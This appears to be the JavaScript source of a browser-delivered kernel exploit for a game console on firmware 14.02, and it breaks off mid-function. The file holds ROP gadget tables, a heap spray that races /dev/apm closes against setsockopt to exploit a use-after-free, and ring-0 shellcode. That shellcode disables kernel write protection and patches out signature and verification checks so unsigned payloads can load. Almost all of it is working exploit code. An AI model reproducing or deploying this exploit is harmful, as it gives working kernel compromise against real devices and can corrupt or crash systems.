import { int64 } from "./int64.js";

const S = {
  read: 3, open: 5, close: 6, ioctl: 54, mprotect: 74, socket: 97, setsockopt: 105,
  getuid: 24, kqueue: 362, kevent: 363, mmap: 477, lseek: 478, thr_self: 432,
  getpid: 20, sysctl: 202, cpuset_getaffinity: 487,
  cpuset_setaffinity: 488, dynlib_get_list: 592, dynlib_get_info: 593,
};

/* offsets into the kernel image.
   14.02 values: anchor / prison0 / rootvnode are unchanged from 14.00.
   swap_rbp is 0x0a81478 on 14.02 (the nominal 0x0a80f68 holds compressed
   data in this build). The runtime scan below still relocates it; this is
   only the fallback so a missed scan cannot point at non-code. */
const K = {
  anchor:    0x00e6c30,
  swap_rbp:  0x0a81478,
  prison0:   0x111fa18,
  rootvnode: 0x2136e90,
};

/* offsets into libSceLibcInternal, with the bytes that must be found there */
const GADGETS = {
  pivot:  [0x0d2812, "488b67385fc3"],
  rdi:    [0x0a6bae, "5fc3"],
  rsi:    [0x095560, "5ec3"],
  rdx:    [0x04e6d2, "5ac3"],
  rcx:    [0x0943ee, "59c3"],
  store:  [0x041ceb, "488907c3"],
  load:   [0x0120b1, "488b07c3"],
  load8:  [0x057fae, "488b4008c3"],
  add:    [0x0aaf8b, "4801f8c3"],
  sub:    [0x0275b4, "4829f8c3"],
  shr:    [0x0a9ba2, "48d3e8c3"],
  shl:    [0x0a9b98, "48d3e0c3"],
  memcpy: [0x026ad0, "554889e54889f8"],
  leave:  [0x09e59d, "c9c3"],
};

const HOST = { page: 0x130000, free: 0x130730, last: 0x131000 };

const TUNE = {
  sprays: 126,
  object: 104,
  window: 0x4000,
  entries: 420,
  stride: 0x90,
  seed: 45,
  spare: 8,
  units: 15,
  batch: 60,
  ceiling: 63,
};

const PROBE_NODES = ["/dev/rng", "/dev/urandom", "/dev/random", "/dev/zero", "/dev/null"];

const BOOTSTRAP =
    "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff"
  + "0f22c0c781900400000000000066c781b5040000eb0066c781b9040000eb00c6"
  + "81c2040000eb66c781b40a0000ff26488d91b40a0000c781802d100102000000"
  + "488991882d1001c781ac2d100101000000c681daaa1f0037c681ddaa1f00370f"
  + "20c0480d000001000f22c031c0c3";

/* [rva, bytes-to-write, name, acceptable-stock-bytes]
   The fourth field is the byte pattern a *stock* kernel may carry at that
   site. A patch is written only when the site already holds the target bytes
   (already applied), one of the listed originals, or the same branch shape
   with a different condition code (see sameShape). Anything else is reported
   and left untouched, and the run continues: these patches support payload
   loading, they are not needed for the exploit or for [9]/[10].
   Guessing an offset is what corrupts a kernel -- the old [7b] shift search
   did exactly that, so it is gone. */
const PATCHES = [
  [0x0000acd, "eb",       "bcopy",                    "74|75"],
  [0x02bd79d, "eb",       "bzero",                    "74|75"],
  [0x02bd7e1, "eb",       "pagezero",                 "74|75"],
  [0x02bd85d, "eb",       "memcpy",                   "74|75"],
  [0x02bd8a1, "eb",       "pagecopy",                 "74|75"],
  [0x02bda4d, "eb",       "copyin",                   "74|75"],
  [0x02bdefd, "eb",       "copyinstr",                "74|75"],
  [0x02bdfcd, "eb",       "copystr",                  "74|75"],
  [0x01b7a43, "eb04",     "dlsym, first check",       "7404|7504"],
  [0x01b7a53, "eb04",     "dlsym, second check",      "7404|7504"],
  [0x01b7a73, "90e9",     "dlsym, nop and jump",      "0f85|0f84"],
  [0x01b7504, "90e9",     "load_prx",                 "0f85|0f84"],
  [0x01b7ab8, "90e93c01", "dlsym, open to every caller", "0f853c01|0f843c01"],
  [0x0628684, "eb00",     "self verification",        "74|75"],
  // 14.02: the 14.00 site 0x0628f6f is inside a call rel32 here, so writing
  // there corrupts the call and panics. 0x062926f is instruction aligned and
  // holds eb 00 on this build, which makes the write a no-op rather than a
  // guess. It is advisory: a mismatch only disables this one patch.
  [0x062926f, "eb00",     "delayed panic on suspend (14.02, advisory)", "eb00|74|75"],
];

/* Patches whose failure is advisory: the exploit and GoldHEN work without
   them, so a refused write must not abort an otherwise sound run. */
const ADVISORY = { "delayed panic on suspend (14.02, advisory)": true };

const STATE = { ctx: null, units: {}, clones: 0, base: null, stubs: {}, batch: undefined, retry: false };

function host() {
  if (!STATE.ctx) throw new Error("afterglow: no host installed");
  return STATE.ctx;
}

function say(fmt) {
  host().mark("AG", fmt);
  try {
    if (/^\[(e|g|p|t|8|9|10|kp|rw|FLOW-DIAG|EARLY-RETURN|OPEN-CHECK|PSIG-DIAG|PBYTE-DIAG|PDIAG)\]/.test(fmt) || /JAILBREAK|defused|thread rc|pthread_create/.test(fmt)) {
      fetch("ag_log?m=" + encodeURIComponent(fmt), { keepalive: true }).catch(function () {});
    }
  } catch (e) {}
}

/* Synchronous log: a fetch/await will not flush if the next step panics the
   kernel, so loader breadcrumbs use a blocking XHR. Keep this out of the hot
   kernel paths -- it is only for steps that can end in a panic. */
function saySync(fmt) {
  say(fmt);
  try {
    const x = new XMLHttpRequest();
    x.open("GET", "ag_log?m=" + encodeURIComponent(fmt), false);
    x.send();
  } catch (e) {}
}

/* Alias used by the payload loader ported from the 14.02 Akatsuki build. */
function sayServer(fmt) { sayAlways(fmt); }

/* The final summary is the only place that explains a refusal, so it must
   reach the dashboard log even though its lines are not prefixed. */
function sayAlways(fmt) {
  host().mark("AG", fmt);
  try {
    fetch("ag_log?m=" + encodeURIComponent(fmt), { keepalive: true }).catch(function () {});
  } catch (e) {}
}

/* host().state is the status *function*, not a data object, so it has no .fw.
   The firmware label lives in the offset table's fw_status ("state=14.02 ..."). */
function fwLabel() {
  try {
    const st = (host().off && host().off.fw_status) || "";
    const m = /state=(\d+\.\d+)/.exec(st);
    if (m) return m[1];
  } catch (e) {}
  return "14.xx";
}

const LOW = 0x100000000;

function v(low, hi) { return new int64(low >>> 0, (hi || 0) >>> 0); }
function plus(a, n) { return n < 0 ? a.sub32(-n) : a.add32(n); }
function same(a, b) { return !!b && a.low === b.low && a.hi === b.hi; }
function inText(a) { return a.hi >= 0xffffff00 && a.low !== 0; }
function inHeap(a) { return a.hi >= 0xffff0000 && a.hi < 0xffffff00 && a.low !== 0; }
function text(a) { return "0x" + a.toString(16).padStart(16, "0"); }

function seedStubs() {
  const c = host();
  const need = new Set();
  for (const k in S) {
    const n = S[k];
    if (!(c.stubAddr && c.stubAddr.has(n)) && !STATE.stubs[n]) need.add(n);
  }
  if (!need.size) return [];

  const base = c.libkernelBase;
  if (!base) return Array.from(need);

  const limit = (c.off && c.off.k_scan_stage1) || 0x200000;
  for (let o = 0; o < limit && need.size; o += 16) {
    const q = c.p.read8(base.add32(o));
    if ((q.low & 0x00ffffff) !== 0xc0c748 || (q.hi >>> 24) !== 0x49) continue;
    const n = ((q.low >>> 24) | ((q.hi & 0x00ffffff) << 8)) >>> 0;
    if (!need.has(n)) continue;
    STATE.stubs[n] = base.add32(o);
    need.delete(n);
  }
  return Array.from(need);
}

function stubFor(num) {
  const c = host();
  if (STATE.stubs[num]) return STATE.stubs[num];
  if (c.stubAddr && c.stubAddr.has(num)) return c.stubAddr.get(num);
  return null;
}

function sc(num) {
  const a = Array.prototype.slice.call(arguments, 1);
  const t = stubFor(num);
  if (!t) throw new Error("afterglow: no libkernel stub for syscall " + num);
  return host().callAddr(t, a);
}

function alloc(size) {
  const c = host();
  const ab = new ArrayBuffer(size);
  const u8 = new Uint8Array(ab);
  const dv = new DataView(ab);
  c.keepAlive.push(ab, u8, dv);
  return { ab: ab, u8: u8, dv: dv, at: c.bufAddr(ab) };
}

function rd4(at) { return host().p.read4(at) >>> 0; }
function rd8(at) { const r = host().p.read8(at); return v(r.low, r.hi); }
function wr1(at, b) { host().p.write1(at, b & 0xff); }
function wr4(at, n) { host().p.write4(at, n >>> 0); }
function wr8(at, q) { host().p.write8(at, q); }

function rdbuf(at, len) {
  const out = new Uint8Array(len);
  const pr = host().p;
  let i = 0;
  while (i + 8 <= len) {
    const q = pr.read8(plus(at, i));
    let lo = q.low >>> 0, hi = q.hi >>> 0;
    for (let k = 0; k < 4; k++) { out[i + k] = lo & 0xff; lo = lo >>> 8; }
    for (let k = 0; k < 4; k++) { out[i + 4 + k] = hi & 0xff; hi = hi >>> 8; }
    i += 8;
  }
  while (i < len) { out[i] = pr.read1(plus(at, i)) & 0xff; i++; }
  return out;
}

function wrbuf(at, bytes) {
  for (let i = 0; i < bytes.length; i++) wr1(plus(at, i), bytes[i]);
}

function unhex(s) {
  const out = new Uint8Array(s.length / 2);
  for (let i = 0; i < out.length; i++) out[i] = parseInt(s.substr(i * 2, 2), 16);
  return out;
}

function hx(bytes) {
  let s = "";
  for (let i = 0; i < bytes.length; i++) {
    s += (i ? " " : "") + ("0" + (bytes[i] & 0xff).toString(16)).slice(-2);
  }
  return s;
}

function sameBytes(a, b) {
  if (a.length !== b.length) return false;
  for (let i = 0; i < a.length; i++) if (a[i] !== b[i]) return false;
  return true;
}

/* Does `cur` hold one of the "a|b" stock patterns in `spec`? */
function looksStock(cur, spec) {
  if (!cur || !spec) return false;
  const alts = spec.split("|");
  for (let a = 0; a < alts.length; a++) {
    const want = unhex(alts[a]);
    if (want.length > cur.length) continue;
    let ok = true;
    for (let i = 0; i < want.length; i++) {
      if (cur[i] !== want[i]) { ok = false; break; }
    }
    if (ok) return true;
  }
  return false;
}

function specLength(spec) {
  if (!spec) return 0;
  const alts = spec.split("|");
  let n = 0;
  for (let i = 0; i < alts.length; i++) n = Math.max(n, alts[i].length / 2);
  return n;
}

/* A second build of the same firmware keeps a function at the same address but
   may encode the same test with a different condition code (je -> jbe, jne ->
   jg, ...). In that case the site is still the site: the patch replaces a
   *conditional* branch with an *unconditional* one and keeps the displacement.
   Accept only that exact shape -- same branch width, same displacement -- so a
   patch can never land in the middle of an unrelated instruction. */
function sameShape(cur, want) {
  if (!cur || !want || !want.length) return false;

  // 1-byte "always take this branch": any short conditional jump (70..7f).
  if (want.length === 1 && want[0] === 0xeb) {
    return cur[0] >= 0x70 && cur[0] <= 0x7f;
  }

  // "eb xx": short conditional jump with the same 8-bit displacement.
  if (want.length === 2 && want[0] === 0xeb) {
    return cur[0] >= 0x70 && cur[0] <= 0x7f && cur[1] === want[1];
  }

  // "90 e9 [rel32...]": a near conditional jump (0f 8x) of the same length.
  // The rel32 stays in place, so only the opcode is compared.
  if (want.length >= 2 && want[0] === 0x90 && want[1] === 0xe9) {
    if (!(cur[0] === 0x0f && cur[1] >= 0x80 && cur[1] <= 0x8f)) return false;
    for (let i = 2; i < want.length; i++) {
      if (cur[i] !== want[i]) return false;
    }
    return true;
  }

  return false;
}

function pokeAt(buf, off, q) {
  buf.dv.setUint32(off, q.low >>> 0, true);
  buf.dv.setUint32(off + 4, q.hi >>> 0, true);
}

function wipe(buf, len) { buf.u8.fill(0, 0, len); }

function cstr(s) {
  const b = alloc(s.length + 8);
  for (let i = 0; i < s.length; i++) b.u8[i] = s.charCodeAt(i);
  b.u8[s.length] = 0;
  return b;
}

function splitNum(n) { return v(n % LOW, Math.floor(n / LOW)); }
function asQ(x) { return (typeof x === "number") ? splitNum(x) : x; }

function codeAt(pageAt, off) {
  return {
    at: plus(pageAt, off),
    n: 0,
    reset: function () { this.n = 0; return this; },
    byte: function (b) { wr1(plus(this.at, this.n), b); this.n++; return this; },
    hex: function (s) {
      const b = unhex(s);
      for (let i = 0; i < b.length; i++) this.byte(b[i]);
      return this;
    },
    dw: function (n) {
      for (let k = 0; k < 4; k++) this.byte(Math.floor(n / Math.pow(256, k)) % 256);
      return this;
    },
    qw: function (q) { return this.dw(q.low >>> 0).dw(q.hi >>> 0); },
    imm: function (bytes) {
      for (let i = 0; i < bytes.length; i++) this.byte(bytes[i]);
      return this;
    },
  };
}

function makeChain(buf, gad) {
  return {
    buf: buf, base: buf.at, n: 0, fix: [], g: gad,

    slot: function (q) { pokeAt(this.buf, this.n * 8, asQ(q)); this.n++; return this.n - 1; },
    num: function (n) { return this.slot(asQ(n)); },
    hole: function () { return this.slot(v(0, 0)); },
    where: function (i) { return plus(this.base, i * 8); },
    gad: function (name) { return this.slot(this.g[name]); },
    point: function (hole, target) { this.fix.push([hole, target]); },

    seal: function () {
      for (let i = 0; i < this.fix.length; i++) {
        pokeAt(this.buf, this.fix[i][0] * 8, this.where(this.fix[i][1]));
      }
      this.gad("leave");
    },

    rdi: function (n) { this.gad("rdi"); return this.num(n); },
    rsi: function (n) { this.gad("rsi"); return this.num(n); },
    rdx: function (n) { this.gad("rdx"); return this.num(n); },

    follow: function (off) {
      const d = off - 8;
      if (d >= 0) { this.rdi(d); this.gad("add"); } else { this.rdi(-d); this.gad("sub"); }
      this.gad("load8");
    },

    save_rax: function (at) { this.rdi(at); this.gad("store"); },
    load_rax: function (at) { this.rdi(at); this.gad("load"); },

    grab: function (dst, len) {
      this.gad("rdi"); const h = this.hole();
      this.gad("store");
      this.gad("rsi"); const s = this.hole();
      this.point(h, s);
      this.rdx(len); this.rdi(dst); this.gad("memcpy");
      return s;
    },

    put: function (dst, src, len) {
      this.gad("rdi"); this.slot(dst);
      this.rsi(src); this.rdx(len); this.gad("memcpy");
    },
  };
}

function shooter(gad) {
  const s = {
    g: gad, fired: 0, sprayed: 0, devs: [], queues: [],
    sockaddr: alloc(16),
  };
  const bs = [16, 2, 0x04, 0xD2, 0x0a, 0, 0, 1];
  for (let i = 0; i < bs.length; i++) s.sockaddr.u8[i] = bs[i];

  s.hold = function (path) {
    const fd = sc(S.open, cstr(path).at, 0).i32;
    if (fd >= 0) this.devs.push(fd);
    return fd;
  };

  s.take = function (build, room) {
    this.why = null;
    if (this.hold("/dev/apm") < 0) {
      this.why = "the clone node refused to open, errno " + host().errno();
      return null;
    }

    let unit = -1, watched = -1;
    const refused = [];
    for (let u = TUNE.ceiling; u >= 0; u--) {
      if (STATE.units[u]) continue;
      const fd = this.hold("/dev/apm" + u);
      if (fd >= 0) { unit = u; watched = fd; break; }
      if (refused.length < 4) refused.push(u + ":e" + host().errno());
    }
    if (unit < 0) {
      this.why = "no apm unit among 0.." + TUNE.ceiling
                 + " (" + Object.keys(STATE.units).length + " spent, refusals "
                 + refused.join(" ") + ")";
      return null;
    }
    STATE.units[unit] = true;
    this.fired++;

    const doomed = sc(S.open, cstr("/dev/apm" + unit).at, 0).i32;
    if (doomed < 0) {
      this.why = "second open of /dev/apm" + unit + " refused, errno " + host().errno();
      return null;
    }

    const q = sc(S.kqueue).i32;
    this.queues.push(q);
    const ev = alloc(32);
    const arm = function () {
      ev.dv.setUint32(0, watched >>> 0, true);
      ev.dv.setUint32(4, 0, true);
      ev.dv.setUint16(8, 0xFFFF, true);
      ev.dv.setUint16(10, 0x0001, true);
      ev.dv.setUint32(12, 0, true);
      ev.u8.fill(0, 16, 32);
      return sc(S.kevent, q, ev.at, 1, 0, 0, 0).i32;
    };
    const armed = arm();
    if (armed !== 0) {
      this.why = "kevent would not arm on unit " + unit + ", rv=" + armed
                 + " errno " + host().errno();
      return null;
    }

    const rop = alloc(room || 0x400);
    const frame = alloc(0x100);
    wipe(frame, 0x100);
    const c = makeChain(rop, this.g);
    c.num(0);
    build(c);
    c.seal();
    pokeAt(frame, 0x38, rop.at);

    const body = alloc(TUNE.object);
    wipe(body, TUNE.object);
    pokeAt(body, 0x38, this.g.pivot);
    pokeAt(body, 0x58, frame.at);

    const req = alloc(40);
    req.dv.setUint32(0, 1, true);
    req.dv.setUint32(4, 0, true);
    pokeAt(req, 8, this.sockaddr.at);
    req.dv.setUint32(16, 16, true);
    pokeAt(req, 24, body.at);
    req.dv.setUint32(32, TUNE.object, true);

    const want = TUNE.seed;
    for (let i = 0; i < want; i++) {
      if (this.hold("/dev/apm") < 0) break;
      STATE.clones++;
    }

    const socks = [];
    for (let i = 0; i < TUNE.sprays; i++) {
      const fd = sc(S.socket, 2, 2, 0).i32;
      if (fd < 0) break;
      socks.push(fd);
    }

    const hh = host();
    const stub = stubFor(S.setsockopt);
    
    if (STATE.batch === undefined && hh.prepareMany && stub) {
      STATE.batch = 0;
      for (let n = TUNE.sprays; n >= 8; n = Math.floor(n * 3 / 4)) {
        try {
          const probeCalls = [];
          for (let i = 0; i < n; i++) probeCalls.push([stub, [0, 17, 128, req.at, 40]]);
          hh.prepareMany(probeCalls);
          STATE.batch = n; break;
        } catch (e) { }
      }
      say("    rop stack takes " + STATE.batch + " calls per entry");
    }
    const batch = (hh.prepareMany && hh.runPrepared && stub) ? (STATE.batch || 0) : 0;
    const fertig = [];
    if (batch) {
      const calls = [];
      for (let i = 0; i < socks.length; i++) calls.push([stub, [socks[i], 17, 128, req.at, 40]]);
      for (let i = 0; i < calls.length; i += batch) {
        fertig.push(hh.prepareMany(calls.slice(i, i + batch)));
      }
      hh.runPrepared(hh.prepareMany([[stubFor(S.getuid), []]]));
    }

    const t0 = (typeof performance !== "undefined") ? performance.now() : Date.now();
    sc(S.close, doomed);
    if (batch) {
      for (let i = 0; i < fertig.length; i++) hh.runPrepared(fertig[i]);
    } else {
      for (let i = 0; i < socks.length; i++) sc(S.setsockopt, socks[i], 17, 128, req.at, 40);
    }
    const t1 = (typeof performance !== "undefined") ? performance.now() : Date.now();
    this.window = t1 - t0;
    this.batched = batch;
    for (let i = 0; i < TUNE.spare; i++) this.hold("/dev/apm");

    this.sprayed = socks.length;
    const r = arm();
    for (let i = 0; i < socks.length; i++) sc(S.close, socks[i]);
    say("    window " + this.window.toFixed(2) + " ms for " + socks.length
        + " setsockopt in " + (this.batched ? fertig.length : socks.length) + " entries");
    return r;
  };

  return s;
}

function ran(r) { return r !== null && r === -1; }

function qAt(buf, off) {
  return v(buf.dv.getUint32(off, true), buf.dv.getUint32(off + 4, true));
}

const GATE = 0x0a0, BODY = 0x0c0, OUT = 0x400, FLAG = 0x420, STAGE = 0x440;
const STAGE_MAX = 0x400;
const SIGIL = 0x600D600D;

function openRing0(roomAt) {
  const r = { at: roomAt, body: codeAt(roomAt, BODY) };
  codeAt(roomAt, GATE).hex("4831c0").hex("4989ca").hex("0f05").hex("c3");

  r.begin = function () { return this.body.reset(); };

  r.run = function () {
    this.body.hex("48b8").qw(plus(this.at, FLAG)).hex("c700").dw(SIGIL).hex("31c0").hex("c3");
    wr4(plus(this.at, FLAG), 0);
    host().callAddr(plus(this.at, GATE), [11, plus(this.at, BODY)]);
    return (rd4(plus(this.at, FLAG)) >>> 0) === (SIGIL >>> 0);
  };

  r.out = function () { return rd8(plus(this.at, OUT)); };

  r.thread = function () {
    this.begin().hex("48ba").qw(plus(this.at, OUT)).hex("48893a");
    return this.run() ? this.out() : null;
  };

  r.base = function () {
    const c = this.begin();
    c.hex("b9").dw(0xc0000082).hex("0f32");
    c.hex("48c1e220").hex("89c0").hex("4809c2");
    c.hex("48b8").qw(plus(this.at, OUT)).hex("488910");
    return this.run() ? plus(this.out(), -0x1c0) : null;
  };

  r.copy = function (dst, src, len, guarded) {
    const c = this.begin();
    if (guarded) c.hex("0f20c0").hex("4825").dw(0xfffeffff).hex("0f22c0");
    c.hex("48bf").qw(dst);
    c.hex("48be").qw(src);
    c.hex("48b9").qw(splitNum(len));
    c.hex("fc").hex("f3a4");
    if (guarded) c.hex("0f20c0").hex("480d").dw(0x00010000).hex("0f22c0");
    return this.run();
  };

  r.apply = function (base, list) {
    const c = this.begin();
    c.hex("48b9").qw(base);
    c.hex("0f20c0").hex("4825").dw(0xfffeffff).hex("0f22c0");
    for (let i = 0; i < list.length; i++) {
      const bytes = unhex(list[i][1]);
      if (bytes.length === 1) c.hex("c681");
      else if (bytes.length === 2) c.hex("66c781");
      else c.hex("c781");
      c.dw(list[i][0]).imm(bytes);
    }
    c.hex("0f20c0").hex("480d").dw(0x00010000).hex("0f22c0");
    return this.run();
  };

  r.read = function (at, len) {
    len = len || 8;
    if (!this.copy(plus(this.at, STAGE), at, len, false)) return null;
    return rdbuf(plus(this.at, STAGE), len);
  };

  r.read_v = function (at) {
    const s = this.read(at, 8);
    if (!s) return null;
    let lo = 0, hi = 0;
    for (let i = 3; i >= 0; i--) lo = lo * 256 + s[i];
    for (let i = 7; i >= 4; i--) hi = hi * 256 + s[i];
    return v(lo, hi);
  };

  r.write = function (at, bytes) {
    wrbuf(plus(this.at, STAGE), bytes);
    return this.copy(at, plus(this.at, STAGE), bytes.length, true);
  };

  r.write_v = function (at, q) {
    const b = new Uint8Array(8);
    let lo = q.low >>> 0, hi = q.hi >>> 0;
    for (let i = 0; i < 4; i++) { b[i] = lo % 256; lo = Math.floor(lo / 256); }
    for (let i = 4; i < 8; i++) { b[i] = hi % 256; hi = Math.floor(hi / 256); }
    return this.write(at, b);
  };

  return r;
}

function isZero(q) { return !q || ((q.low >>> 0) === 0 && (q.hi >>> 0) === 0); }

let MAPS = null;

function findLibByShape() {
  const r = { base: null, entries: 0, big: 0, first: [], note: null };
  MAPS = [];
  const pid = sc(S.getpid).i32;
  const mib = alloc(16);
  mib.dv.setInt32(0, 1, true); mib.dv.setInt32(4, 14, true);
  mib.dv.setInt32(8, 32, true); mib.dv.setInt32(12, pid, true);
  const len = alloc(8);
  len.dv.setUint32(0, 0, true); len.dv.setUint32(4, 0, true);
  let rv = sc(S.sysctl, mib.at, 4, 0, len.at, 0, 0).i32;
  let need = len.dv.getUint32(0, true);
  if (rv !== 0 || !need) { r.note = "vmmap sizing rv=" + rv; return r; }
  const buf = alloc(need + 0x8000);
  len.dv.setUint32(0, need + 0x8000, true); len.dv.setUint32(4, 0, true);
  rv = sc(S.sysctl, mib.at, 4, buf.at, len.at, 0, 0).i32;
  const used = Math.min(len.dv.getUint32(0, true), buf.u8.length);
  if (rv !== 0 || !used) { r.note = "vmmap read rv=" + rv; return r; }

  const span = HOST.last;
  const cand = [];
  let off = 0;
  while (off + 8 <= used) {
    const size = buf.dv.getInt32(off, true);
    if (size <= 0 || off + size > used) break;
    r.entries++;
    const start = qAt(buf, off + 8), stop = qAt(buf, off + 16);
    MAPS.push([start, stop]);
    if (r.first.length < 4) r.first.push(text(start) + "-" + text(stop));
    const bytes = (stop.hi - start.hi) * LOW + (stop.low - start.low);
    if (start.hi > 0 && (start.low & 0x3fff) === 0 && bytes >= span) {
      cand.push(start); r.big++;
    }
    off += size;
  }

  const probes = [GADGETS.pivot, GADGETS.memcpy];
  for (let i = 0; i < cand.length; i++) {
    let all = true;
    for (let k = 0; k < probes.length && all; k++) {
      const want = unhex(probes[k][1]);
      if (!sameBytes(rdbuf(plus(cand[i], probes[k][0]), want.length), want)) all = false;
    }
    if (all) { r.base = cand[i]; return r; }
  }
  r.note = "no mapping carries the gadget shape (" + r.big + " of " + r.entries + " long enough)";
  return r;
}

function findLib(name) {
  const r = { base: null, rv: null, count: 0, seen: [], note: null };
  const list = alloc(4 * 0x300), count = alloc(8);
  count.dv.setUint32(0, 0, true); count.dv.setUint32(4, 0, true);
  r.rv = sc(S.dynlib_get_list, list.at, 0x300, count.at).i32;
  r.count = count.dv.getUint32(0, true);
  if (r.rv !== 0) { r.note = "dynlib_get_list rv=" + r.rv; return r; }
  if (!r.count) { r.note = "the module list came back empty"; return r; }

  const info = alloc(0x160);
  for (let i = 0; i < r.count; i++) {
    info.u8.fill(0);
    info.dv.setUint32(0, 0x160, true);
    const rv = sc(S.dynlib_get_info, list.dv.getUint32(i * 4, true), info.at).i32;
    if (rv !== 0) continue;
    let nm = "";
    for (let k = 8; k < 0x100 && info.u8[k] !== 0; k++) nm += String.fromCharCode(info.u8[k]);
    if (r.seen.length < 6) r.seen.push(nm);
    if (nm === name) {
      let b = qAt(info, 0x108);
      if (!isZero(b)) { r.base = b; r.at = "0x108"; return r; }
      const cand = [];
      for (let o = 8; o + 8 <= 0x160; o += 8) {
        const q = qAt(info, o);
        if (isZero(q)) continue;
        if (q.hi > 0x40) continue;
        if ((q.low & 0x3fff) !== 0) continue;
        cand.push("+0x" + o.toString(16) + "=" + text(q));
        if (r.base === null) { r.base = q; r.at = "+0x" + o.toString(16); }
      }
      r.note = cand.length
        ? ("base not at +0x108; grid aligned candidates: " + cand.join(" "))
        : "found " + name + " but no plausible base anywhere in the info struct";
      return r;
    }
  }
  r.note = name + " is not among the " + r.count + " modules";
  return r;
}

function pinCore() {
  const mask = alloc(16);
  mask.u8.fill(0);
  let rv = sc(S.cpuset_getaffinity, 3, 1, -1, 16, mask.at).i32;
  if (rv !== 0) return { ok: false, note: "getaffinity rv=" + rv };

  const allowed = [];
  for (let b = 0; b < 128; b++) {
    if ((mask.u8[b >> 3] >> (b & 7)) & 1) allowed.push(b);
  }
  if (!allowed.length) return { ok: false, note: "no core in the mask" };

  /* Every allowed core in turn, not just the lowest: setaffinity can answer
     -1 for the first core it is offered while accepting the next one. Which
     core it ends up on does not matter -- only that the free and the refill
     land on the same one. */
  const versuche = [];
  for (let i = 0; i < allowed.length; i++) {
    const core = allowed[i];
    mask.u8.fill(0);
    mask.u8[core >> 3] = 1 << (core & 7);
    rv = sc(S.cpuset_setaffinity, 3, 1, -1, 16, mask.at).i32;
    versuche.push(core + ":rv" + rv);
    if (rv === 0) {
      return {
        ok: true, core: core, allowed: allowed.join(","),
        note: versuche.length > 1 ? "setaffinity ok after " + versuche.join(" ") : "setaffinity rv=0",
      };
    }
  }
  return { ok: false, allowed: allowed.join(","), note: "every allowed core refused: " + versuche.join(" ") };
}

const PADDING = 0x0b3a300;
const OFF_STUB = 0x100, OFF_DEVS = 0x110, OFF_QUEUES = 0x170;
const RET0 = 0x00c3c031;

function rehangRing0(k, room, ofs, list, from, copy) {
  if (!list.length || list.length > 256 || !from) return null;
  for (let i = 0; i < list.length; i++) wr4(plus(room, STAGE + i * 4), list[i]);
  const c = k.begin();
  c.hex("31c0");
  c.hex("48be").qw(plus(room, STAGE));
  c.hex("48b9").qw(splitNum(list.length));
  c.hex("49b8").qw(ofs);
  c.hex("49b9").qw(from);
  c.hex("49ba").qw(copy);
  c.hex("4885c9").hex("7421").hex("486316").hex("4883c604").hex("48ffc9");
  c.hex("4d8b1cd0").hex("4d85db").hex("74e8").hex("4d394b08").hex("75e2");
  c.hex("4d895308").hex("ffc0").hex("ebda");
  c.hex("48ba").qw(plus(room, OUT)).hex("488902");
  if (!k.run()) return null;
  return rd4(plus(room, OUT));
}

function countOffRing0(k, room, ofs, list, copy) {
  if (!list.length || list.length > 256) return null;
  for (let i = 0; i < list.length; i++) wr4(plus(room, STAGE + i * 4), list[i]);
  const c = k.begin();
  c.hex("31c0");
  c.hex("48be").qw(plus(room, STAGE));
  c.hex("48b9").qw(splitNum(list.length));
  c.hex("49b8").qw(ofs);
  c.hex("49ba").qw(copy);
  c.hex("4885c9").hex("741d").hex("486316").hex("4883c604").hex("48ffc9");
  c.hex("4d8b1cd0").hex("4d85db").hex("7406").hex("4d395308").hex("74e2");
  c.hex("ffc0").hex("ebde");
  c.hex("48ba").qw(plus(room, OUT)).hex("488902");
  if (!k.run()) return null;
  return rd4(plus(room, OUT));
}

function teardown(k, kbase, ofs, devs, queues, room) {
  const kat = function (rva) { return plus(kbase, rva); };
  const fileOf = function (fd) { return k.read_v(plus(ofs, fd * 8)); };

  const stub = kat(PADDING + OFF_STUB);
  const dtab = kat(PADDING + OFF_DEVS);
  const qtab = kat(PADDING + OFF_QUEUES);

  say("[t] reading the padding at " + text(stub));
  const there = k.read_v(stub);
  if (!there) { say("[t] kernel text not readable at " + text(stub)); return false; }
  say("[t] it holds " + text(there));
  if ((there.low >>> 0) === (RET0 >>> 0)) {
    say("[t] the stub is already there from an earlier run");
  } else if (isZero(there)) {
    if (!k.write_v(stub, v(RET0, 0))) { say("[t] kernel text not writable"); return false; }
    const back = k.read_v(stub);
    if (!back || (back.low >>> 0) !== (RET0 >>> 0)) { say("[t] the stub did not stick"); return false; }
  } else {
    say("[t] something else is at " + text(stub) + ": " + text(there)); return false;
  }

  const clone = function (from, to, what) {
    for (let i = 0; i <= 10; i++) {
      let q = k.read_v(plus(from, i * 8));
      if (!q) { say("[t] " + what + " unreadable at +0x" + (i * 8).toString(16)); return false; }
      if (i === 7) q = stub;
      if (!k.write_v(plus(to, i * 8), q)) { say("[t] " + what + " not writable"); return false; }
    }
    const c = k.read_v(plus(to, 0x38));
    return c !== null && same(c, stub);
  };

  const original = function (list, copy) {
    for (let i = 0; i < list.length; i++) {
      const f = fileOf(list[i]);
      if (f && inHeap(f)) {
        const cur = k.read_v(plus(f, 0x08));
        if (cur && inText(cur) && !same(cur, copy)) return cur;
      }
    }
    return null;
  };
  const ready = function (copy) {
    const c = k.read_v(plus(copy, 0x38));
    return c !== null && same(c, stub);
  };
  const rehang = function (list, from, copy) {
    let moved = 0;
    for (let i = 0; i < list.length; i++) {
      const f = fileOf(list[i]);
      const cur = (f && inHeap(f)) ? k.read_v(plus(f, 0x08)) : null;
      if (cur && same(cur, copy)) moved++;
      else if (cur && from && same(cur, from) && k.write_v(plus(f, 0x08), copy)) moved++;
    }
    return moved;
  };

  say("[t] looking for the device table across " + devs.length + " handles");
  const devOps = original(devs, dtab);
  if (devOps) {
    if (!ready(dtab) && !clone(devOps, dtab, "device table")) return false;
  } else if (!ready(dtab)) {
    say("[t] no device table to copy -- nothing done"); return false;
  }
  let moved = rehangRing0(k, room, ofs, devs, devOps, dtab);
  if (moved === null) { say("[t] rehanging one at a time"); moved = rehang(devs, devOps, dtab); }
  say("[t] " + moved + " of " + devs.length + " handles on the copy");

  let movedq = 0;
  if (queues && queues.length) {
    const qOps = original(queues, qtab);
    if (qOps && !same(qOps, devOps || qtab)) {
      if (ready(qtab) || clone(qOps, qtab, "queue table")) movedq = rehang(queues, qOps, qtab);
    } else if (ready(qtab)) movedq = queues.length;
  }
  say("[t] " + movedq + " of " + (queues ? queues.length : 0) + " queues on the copy");

  let notes = 0;
  for (let i = 0; queues && i < queues.length; i++) {
    const f = fileOf(queues[i]);
    if (!f || !inHeap(f)) continue;
